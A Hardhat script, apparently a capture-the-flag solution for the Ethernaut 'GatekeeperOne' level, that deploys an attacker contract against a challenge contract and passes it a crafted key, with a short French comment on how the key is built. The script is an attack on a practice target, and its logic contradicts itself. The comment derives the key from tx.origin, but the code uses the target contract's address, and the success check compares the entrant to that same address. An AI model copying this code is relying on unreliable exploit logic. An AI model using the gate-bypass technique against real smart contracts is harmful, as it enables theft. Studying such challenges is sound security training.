import { ethers } from "hardhat";

const CONTRACT_NAME = "GatekeeperOne";
const CONTRACT_ADDRESS = "0x0dB688d0E1Cc5BbB14336A52b9ed5e7E848EA50A";
const ATTACKER_CONTRACT_NAME = "GatekeeperOneAttacker";

async function hack() {
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  //deploy attacker contract
  const attackerFactory = await ethers.getContractFactory(
    ATTACKER_CONTRACT_NAME
  );
  const attackerContract = await attackerFactory.deploy(contract.address);

  //hack
  const inputHack = contract.address.slice(0, 6) + "000000000000";

  const txHack = await attackerContract.attack(inputHack);
  await txHack.wait();

  const entrant = await contract.entrant();
  if (entrant === contract.address) console.log("🚀 Contract hacked");
  else console.log("❌ Contract not hacked");
}

hack().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});

// set une chaine hexadecimal de longueur 16+2 (0x) dont les 4 premiers sont non null
// exemple 0xa2B3000000000000 que l'on détermine en gardant les 4+2 premiers caractères de tx.origine
